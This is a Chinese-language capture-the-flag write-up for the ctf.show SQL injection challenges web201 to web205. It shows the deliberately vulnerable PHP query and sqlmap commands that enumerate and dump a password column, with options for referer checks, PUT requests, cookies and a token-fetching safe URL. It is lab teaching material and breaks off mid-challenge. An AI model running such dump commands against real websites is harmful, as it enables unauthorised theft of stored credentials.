&lt;img data-src=&#34;\images\article_images\image-20250827140659057.png&#34; alt=&#34;image-20250827140659057&#34; style=&#34;zoom:33%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查字段记录&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;literal&#34;&gt;-T&lt;/span&gt; ctfshow_user &lt;span class=&#34;literal&#34;&gt;-C&lt;/span&gt; pass &lt;span class=&#34;literal&#34;&gt;--dump&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827140825525.png&#34; alt=&#34;image-20250827140825525&#34; style=&#34;zoom: 25%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;linux环境下命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;┌──(kali㉿kali)-[~]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;└─$ sqlmap -u &lt;span class=&#34;string&#34;&gt;&amp;quot;http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1&amp;quot;&lt;/span&gt; --referer=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; --dbs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;┌──(kali㉿kali)-[~]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;└─$ sqlmap -u &lt;span class=&#34;string&#34;&gt;&amp;quot;http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1&amp;quot;&lt;/span&gt; --refer=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; -D ctfshow_web --tables&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;┌──(kali㉿kali)-[~]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;└─$ sqlmap -u &lt;span class=&#34;string&#34;&gt;&amp;quot;http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1&amp;quot;&lt;/span&gt; --refer=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; -D ctfshow_web -T ctfshow_user --columns&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;┌──(kali㉿kali)-[~]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;└─$ sqlmap -u &lt;span class=&#34;string&#34;&gt;&amp;quot;http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1&amp;quot;&lt;/span&gt; --refer=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; -D ctfshow_web -T ctfshow_user -C pass --dump&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827150653446.png&#34; alt=&#34;image-20250827150653446&#34; style=&#34;zoom:33%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827150744707.png&#34; alt=&#34;image-20250827150744707&#34; style=&#34;zoom:33%;&#34; /&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web202&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web202&#34;&gt;#&lt;/a&gt; web202&lt;/h1&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; 使用&lt;span class=&#34;comment&#34;&gt;--data 调整sqlmap的请求方式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询语句&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;拼接&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;语句查找指定ID用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &amp;quot;select id,username,password from ctfshow_user where username !=&amp;#x27;flag&amp;#x27; and id = &amp;#x27;&amp;quot;.$_GET[&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;].&amp;quot;&amp;#x27;;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;返回逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;对传入的参数进行了过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; waf($str)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;代码过于简单，不宜展示&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;https://bf28f69c-ae85-47ca-9f6d-0ca9f314dbad.challenge.ctf.show/api/&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--data&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;literal&#34;&gt;-T&lt;/span&gt; ctfshow_user &lt;span class=&#34;literal&#34;&gt;-C&lt;/span&gt; pass &lt;span class=&#34;literal&#34;&gt;--dump&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827154802794.png&#34; alt=&#34;image-20250827154802794&#34; style=&#34;zoom:33%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web203&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web203&#34;&gt;#&lt;/a&gt; web203&lt;/h1&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; 使用&lt;span class=&#34;comment&#34;&gt;--method 调整sqlmap的请求方式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询语句&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;拼接&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;语句查找指定ID用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &amp;quot;select id,username,password from ctfshow_user where username !=&amp;#x27;flag&amp;#x27; and id = &amp;#x27;&amp;quot;.$_GET[&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;].&amp;quot;&amp;#x27;;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;返回逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;对传入的参数进行了过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; waf($str)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;代码过于简单，不宜展示&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;默认情况下，sqlmap 发送的是 GET 或 POST 请求。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果目标接口使用 PUT 方法上传数据（比如  &lt;code&gt;REST API&lt;/code&gt; 、文件上传接口），需要显式告诉 sqlmap 用 PUT&lt;br&gt;
 方式发送请求，且 sqlmap 是对具体的 Web 接口 URL 进行测试，因此需要此题需要  &lt;code&gt;index.php&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PUT 请求不像传统 POST 表单，它需要指定  &lt;code&gt;Content-Type&lt;/code&gt; ，告诉服务器数据类型。&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;如果接口接收 原始文本 /  &lt;code&gt;JSON&lt;/code&gt;  / 表单， &lt;code&gt;Content-Type&lt;/code&gt;  不匹配，服务器可能直接拒绝请求或报错。&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt; &lt;code&gt;text/plain&lt;/code&gt;  是告诉服务器：“这是普通文本”，便于 sqlmap 发送参数进行注入测试。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://9b26b5a1-7edd-4d21-869d-032e10b3d35e.challenge.ctf.show/api/index.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--method&lt;/span&gt;=PUT &lt;span class=&#34;literal&#34;&gt;--headers&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/plain&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--data&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;literal&#34;&gt;-T&lt;/span&gt; ctfshow_user &lt;span class=&#34;literal&#34;&gt;-C&lt;/span&gt; pass &lt;span class=&#34;literal&#34;&gt;--dump&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827160037159.png&#34; alt=&#34;image-20250827160037159&#34; style=&#34;zoom: 25%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web204&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web204&#34;&gt;#&lt;/a&gt; web204&lt;/h1&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; 使用&lt;span class=&#34;comment&#34;&gt;--cookie 提交cookie数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询语句&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;拼接&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;语句查找指定ID用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &amp;quot;select id,username,password from ctfshow_user where username !=&amp;#x27;flag&amp;#x27; and id = &amp;#x27;&amp;quot;.$_GET[&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;].&amp;quot;&amp;#x27;;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;返回逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;对传入的参数进行了过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; waf($str)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;代码过于简单，不宜展示&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://b44a070a-0b0b-4a05-a700-108acfd2ebf6.challenge.ctf.show/api/index.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--method&lt;/span&gt;=PUT &lt;span class=&#34;literal&#34;&gt;--headers&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/plain&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--cookie&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;PHPSESSID=abcd&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--data&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;literal&#34;&gt;-T&lt;/span&gt; ctfshow_user &lt;span class=&#34;literal&#34;&gt;-C&lt;/span&gt; pass &lt;span class=&#34;literal&#34;&gt;--dump&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827161433716.png&#34; alt=&#34;image-20250827161433716&#34; style=&#34;zoom: 25%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web205&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web205&#34;&gt;#&lt;/a&gt; web205&lt;/h1&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; api调用需要鉴权&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询语句&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;拼接&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;语句查找指定ID用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &amp;quot;select id,username,password from ctfshow_user where id = &amp;#x27;&amp;quot;.$_GET[&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;].&amp;quot;&amp;#x27;;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;返回逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;对传入的参数进行了过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; waf($str)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;代码过于简单，不宜展示&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;每次请求 &lt;code&gt;/api&lt;/code&gt;  之前会去请求一次  &lt;code&gt;getToken.php&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827163958594.png&#34; alt=&#34;image-20250827163958594&#34; style=&#34;zoom:33%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827163456355.png&#34; alt=&#34;image-20250827163456355&#34; style=&#34;zoom:33%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sqlmap 提供了以下两个参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;code&gt;--safe-url&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;作用：提供一个安全、不会出错的 URL，sqlmap 会在测试注入之前访问这个 URL，确保数据库和网站状态正常&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt; &lt;code&gt;--safe-freq&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;作用：控制 每次注入测试前访问安全 URL 的次数。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;默认值：通常为 1&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;添加  &lt;code&gt;--safe-url=&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot;&lt;/code&gt;  和   &lt;code&gt;--safe-freq=1&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
